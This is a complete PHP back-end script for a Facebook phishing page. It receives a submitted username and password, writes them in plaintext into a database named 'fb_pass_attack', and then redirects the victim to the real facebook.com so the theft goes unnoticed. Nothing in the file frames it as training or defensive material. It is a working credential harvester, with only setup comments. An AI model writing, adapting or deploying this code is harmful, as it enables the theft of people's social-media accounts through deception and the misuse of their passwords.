<?php
// Database connection details
$servername = "localhost";      // "localhost" if the database is on the same server
$username = "root";             // Replace with database username
$password = "";                 // Replace with database password
$dbname = "fb_pass_attack"; // Replace with the name of database

// Connect to the database
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Collect form data
$uname = $_POST['username'];
$pass = $_POST['password'];

// Prepare and bind the SQL statement to prevent SQL injection
$stmt = $conn->prepare("INSERT INTO users (`username`,`password`) VALUES (?,?)");
$stmt->bind_param("ss", $uname, $pass);

// Execute the statement
if ($stmt->execute()) {
    header("Location: https://www.facebook.com");
    exit();
} else {
    echo "Error: " . $stmt->error;
}

// Close the connection
$stmt->close();
$conn->close();
?>